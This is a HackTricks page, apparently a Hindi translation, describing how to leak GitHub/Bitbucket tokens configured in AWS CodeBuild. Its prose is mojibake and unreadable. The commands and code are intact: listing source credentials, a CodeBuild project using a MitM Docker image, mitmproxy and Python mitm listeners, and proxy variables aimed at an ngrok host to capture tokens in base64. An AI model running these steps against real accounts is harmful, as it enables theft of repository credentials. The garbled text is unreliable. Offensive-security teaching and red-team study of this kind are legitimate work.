# AWS Codebuild - Token Leakage

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**subscription plans**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рд╣рдореЗрдВ **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>
{% endhint %}

## Github/Bitbucket рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП Tokens рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реНрд░реЛрдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк leak рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
aws codebuild list-source-credentials
```
### Docker Image рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Github рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЦрд╛рддреЗ рдореЗрдВ рд╕реЗрдЯ рд╣реИ, рддреЛ рдЖрдк **Codebuild** рдХреЛ **рд╡рд┐рд╢рд┐рд╖реНрдЯ docker image** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрдирд╛рдХрд░** рдЙрд╕ **рдкрд╣реБрдВрдЪ** (**GH token рдпрд╛ OAuth token**) рдХреЛ **рдирд┐рдХрд╛рд▓** рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдк **рдирдпрд╛ Codebuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ **рдкрд░реНрдпрд╛рд╡рд░рдг** рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **Docker image** рд╕реЗрдЯ рдХрд░ рд╕рдХреЗрдВред

рдЖрдк рдЬреЛ Docker image рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ред рдпрд╣ рдПрдХ рдмрд╣реБрдд рд╣реА рдмреБрдирд┐рдпрд╛рджреА Docker image рд╣реИ рдЬреЛ **env variables `https_proxy`**, **`http_proxy`** рдФрд░ **`SSL_CERT_FILE`** рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ред рдпрд╣ рдЖрдкрдХреЛ **`https_proxy`** рдФрд░ **`http_proxy`** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдФрд░ **`SSL_CERT_FILE`** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ SSL CERT рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

1. **рдЕрдкрдиреА рдЦреБрдж рдХреА Docker MitM image рдмрдирд╛рдПрдВ рдФрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ**
* рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА IP рдкрддреЗ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдФрд░ рдЕрдкрдиреЗ SSL cert рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП repo рдХреЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ рдФрд░ **docker image рдмрдирд╛рдПрдВ**ред
* **`http_proxy` рд╕реЗрдЯ рди рдХрд░реЗрдВ** рддрд╛рдХрд┐ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдЖрдк **`ngrok`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ `ngrok tcp 4444` рдЕрдкрдиреЗ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк Docker image рдмрдирд╛ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ **рдЗрд╕реЗ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ repo (Dockerhub, ECR...) рдкрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ**
2. **рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реЗрдЯ рдХрд░реЗрдВ**
* рдПрдХ **рдирдпрд╛ Codebuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдПрдВ** рдпрд╛ рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**ред
* рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ **рдкрд╣рд▓реЗ рд╕реЗ рдЬрдирд░реЗрдЯ рдХрд┐рдП рдЧрдП Docker image** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░реЗрдВ

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **рдЕрдкрдиреЗ рд╣реЛрд╕реНрдЯ рдореЗрдВ MitM рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд░реЗрдВ**

* рдЬреИрд╕рд╛ рдХрд┐ **Github repo** рдореЗрдВ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**mitmproxy рд╕рдВрд╕реНрдХрд░рдг 9.0.1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**, рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рд╕рдВрд╕реНрдХрд░рдг 10 рдХреЗ рд╕рд╛рде рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

4. **рдмрд┐рд▓реНрдб рдЪрд▓рд╛рдПрдВ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВ**

*   рдЖрдк **Authorization** рд╣реЗрдбрд░ рдореЗрдВ рдЯреЛрдХрди рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ aws cli рд╕реЗ рднреА рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ~~

{% hint style="success" %}
**рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЛ AWS рдиреЗ 20 рдлрд░рд╡рд░реА 2023 рдХреЗ рд╕рдкреНрддрд╛рд╣ рдореЗрдВ рдХрд┐рд╕реА рд╕рдордп рдареАрдХ рдХрд░ рджрд┐рдпрд╛ рдерд╛ (рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рд╢реБрдХреНрд░рд╡рд╛рд░ рдХреЛ)ред рдЗрд╕рд▓рд┐рдП рдЕрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ :)**
{% endhint %}

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **CodeBuild рдореЗрдВ рдЙрдиреНрдирдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рд╡рд╣ Github/Bitbucket token рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдпрджрд┐ рдЕрдиреБрдорддрд┐рдпрд╛рдБ OAuth рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рдереАрдВ, рддреЛ **рдХреЛрдб рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЕрд╕реНрдерд╛рдпреА OAuth token** рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

* рдПрдХ рд╣рдорд▓рд╛рд╡рд░ CodeBuild рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ environment variables **http\_proxy** рдФрд░ **https\_proxy** рдХреЛ рдЕрдкрдиреА рдорд╢реАрди рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `http://5.tcp.eu.ngrok.io:14972`)ред

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* рдлрд┐рд░, github repo рдХреЗ URL рдХреЛ HTTP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* рдлрд┐рд░, [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) рд╕реЗ рдмреЗрд╕рд┐рдХ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдЙрд╕ рдкреЛрд░реНрдЯ рдкрд░ рдЪрд▓рд╛рдПрдВ рдЬреЛ proxy variables (http\_proxy рдФрд░ https\_proxy) рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* рдЕрдВрдд рдореЗрдВ, **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдмрд┐рд▓реНрдб рдХрд░реЗрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдХреЛ **рд╕реНрдкрд╖реНрдЯ рдЯреЗрдХреНрд╕реНрдЯ** (base64) рдореЗрдВ mitm рдкреЛрд░реНрдЯ рдкрд░ **рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**:

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
рдЕрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдорд╢реАрди рд╕реЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛, рдЗрд╕рдХреЗ рд╕рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ рд╕реАрдзреЗ CodeBuild рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЗрд╕реЗ (рджреБрд░реБрдкрдпреЛрдЧ) рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛрдЧрд╛ред
{% endhint %}

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд╝рд┐рдЯрд░реА рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
